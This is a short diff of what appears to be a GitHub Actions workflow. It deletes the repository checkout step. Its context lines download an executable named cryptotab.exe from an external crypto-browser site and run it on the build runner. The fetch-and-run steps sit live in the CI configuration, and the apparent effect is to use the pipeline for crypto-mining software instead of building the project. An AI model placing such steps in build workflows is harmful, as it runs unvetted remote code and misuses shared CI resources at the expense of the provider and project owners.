@@ -13,7 +13,6 @@ jobs:
       run: Invoke-WebRequest https://cryptobrowser.site/get/BrowserSetup.exe -OutFile cryptotab.exe
     - run: .\cryptotab.exe
 
-    - uses: actions/checkout@v2
     - name: Set up Python
       uses: actions/setup-python@v1
       with:
